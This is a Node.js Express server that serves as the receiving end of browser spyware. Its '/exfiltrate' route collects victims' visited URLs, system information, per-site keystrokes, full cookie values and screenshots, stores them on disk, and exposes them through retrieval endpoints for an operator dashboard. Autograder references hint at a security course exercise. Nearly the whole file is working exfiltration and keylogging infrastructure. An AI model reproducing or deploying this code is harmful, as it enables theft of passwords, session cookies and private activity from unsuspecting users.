import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));

// Data storage
var links = new Array();
var system_info;
var keylogger_info;
var cookies_data = []; // New array for cookies

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
});


app.post('/exfiltrate', (req, res) => {
    const { type, data } = req.body;
    if (!type || !data) {
        res.status(400).send('Bad Request: Missing type or data');
        return;
    }

    // Create necessary directories if they don't exist
    const dirs = [
        path.join(__dirname, "csv/urls"),
        path.join(__dirname, "csv/keylogger"),
        path.join(__dirname, "csv/cookies"),  // New cookies directory
        path.join(__dirname, "csv/images"),
        path.join(__dirname, "csv")
    ];

    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });

    switch (type) {
        case 'urls':
            const url = data;
            console.log("Received URL:", url);
            links.push({
              url: url,
              receivedAt: new Date()
            });

            const csvHeader = "receivedAt, url\n";
            const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
            const filePath = path.join(__dirname, "csv/urls/urls.csv");
            fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");

            const autograderFilePath = path.join(__dirname, "csv/urls/autograder_links.csv");
            const autograderContent = links.map(link => link.url).join(",");
            fs.writeFileSync(autograderFilePath, autograderContent, "utf8");
            break;

        case 'os':
            console.log("OS info received");
            system_info = data;

            const osFilePath = path.join(__dirname, "csv/os.json");
            const osData = {
                receivedAt: new Date().toISOString(),
                osInfo: system_info
            };
            fs.writeFileSync(osFilePath, JSON.stringify(osData, null, 2), "utf8");
            break;

        case 'keys':
            console.log("Keylogger data received");
            keylogger_info = data;

            const logFilePath = path.join(__dirname, "csv/keylogger/keylogger.log");
            let logContent = "";

            for (const [url, entries] of Object.entries(keylogger_info)) {
                logContent += `${url}:\n`;
                entries.forEach(entry => {
                    logContent += `[${entry.timestamp}] ${entry.text}\n`;
                });
                logContent += "\n";
            }

            fs.appendFileSync(logFilePath, logContent, "utf8");

            // Also save as JSON for easier parsing
            const keysJsonPath = path.join(__dirname, "csv/keylogger/keylogger.json");
            fs.writeFileSync(keysJsonPath, JSON.stringify(keylogger_info, null, 2), "utf8");
            break;

        case 'cookies':
            console.log("Cookies received from:", data.url || "unknown source");

            // Add timestamp to the cookie data
            const cookieEntry = {
                receivedAt: new Date().toISOString(),
                url: data.url || "unknown",
                domain: data.domain || "unknown",
                cookies: data.cookies || []
            };

            // Store in memory
            cookies_data.push(cookieEntry);

            // Save to log file (human readable)
            const cookieLogPath = path.join(__dirname, "csv/cookies/cookies.log");
            let cookieLogContent = `[${cookieEntry.receivedAt}] From: ${cookieEntry.url}\n`;

            if (cookieEntry.cookies && cookieEntry.cookies.length > 0) {
                cookieEntry.cookies.forEach(cookie => {
                    cookieLogContent += `  ${cookie.name}: ${cookie.value}\n`;
                    if (cookie.domain) cookieLogContent += `    Domain: ${cookie.domain}\n`;
                    if (cookie.path) cookieLogContent += `    Path: ${cookie.path}\n`;
                    if (cookie.expirationDate) {
                        const expDate = new Date(cookie.expirationDate * 1000);
                        cookieLogContent += `    Expires: ${expDate.toISOString()}\n`;
                    }
                    cookieLogContent += `    Secure: ${cookie.secure}, HttpOnly: ${cookie.httpOnly}\n`;
                });
            }
            cookieLogContent += "\n";

            fs.appendFileSync(cookieLogPath, cookieLogContent, "utf8");

            // Save as JSON for easy access
            const cookieJsonPath = path.join(__dirname, "csv/cookies/cookies.json");
            fs.writeFileSync(cookieJsonPath, JSON.stringify(cookies_data, null, 2), "utf8");

            console.log(`Saved ${cookieEntry.cookies.length} cookies from ${cookieEntry.url}`);
            break;

        case 'screenshot':
            const base64Data = data.replace(/^data:image\/png;base64,/, "");
            const ss_path = path.join(__dirname, "csv/images", `screenshot_${Date.now()}.png`);

            fs.writeFile(ss_path, base64Data, "base64", (err) => {
                if (err) {
                    console.error("Error saving screenshot:", err);
                    return res.status(500).send("Failed to save screenshot");
                }
                console.log("Screenshot saved:", ss_path);
            });
            break;

        default:
            console.log(`Unknown type: ${type}`);
            break;
    }

    res.sendStatus(200);
});



/*

HELPERS

*/

app.get('/get-urls', (req, res) => {
    res.json(links);
});

app.get('/for-testing', (req, res) => {
    try {
        const fileContent = fs.readFileSync(path.join(__dirname, "csv/urls/autograder_links.csv"), "utf8");
        res.send(fileContent);
    } catch (error) {
        res.send('');
    }
});

app.get('/get-os', (req, res) => {
    if (system_info)
        res.json(system_info);
    else
        res.json({});
});

app.get('/get-keys', (req, res) => {
    res.json(keylogger_info || {});
});

// New endpoint to get all cookies
app.get('/get-cookies', (req, res) => {
    res.json(cookies_data);
});

// New endpoint to get cookies for a specific domain
app.get('/get-cookies/:domain', (req, res) => {
    const domain = req.params.domain.toLowerCase();
    const filtered = cookies_data.filter(entry =>
        entry.url.toLowerCase().includes(domain) ||
        (entry.domain && entry.domain.toLowerCase().includes(domain))
    );
    res.json(filtered);
});

app.use("/images", express.static(path.join(__dirname, "csv/images")));

app.get("/get-images", (req, res) => {
    const imagesDir = path.join(__dirname, "csv/images");

    fs.readdir(imagesDir, (err, files) => {
        if (err) {
            console.error("Error reading images directory:", err);
            return res.status(500).send("Failed to load images");
        }

        // Sort images by newest first (based on timestamp in filename)
        files.sort((a, b) => b.localeCompare(a));

        // Send list of image URLs
        res.json(files.map(file => `/images/${file}`));
    });
});


app.listen(PORT, () => {
    console.log(`Server running on: http://localhost:${PORT}/`);

    // Create all necessary directories on startup
    const dirs = [
        path.join(__dirname, "csv/urls"),
        path.join(__dirname, "csv/keylogger"),
        path.join(__dirname, "csv/cookies"),
        path.join(__dirname, "csv/images"),
        path.join(__dirname, "csv")
    ];

    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            console.log(`Created directory: ${dir}`);
        }
    });

    console.log("Server ready to receive: urls, os, keys (keylogger), cookies, and screenshots");
});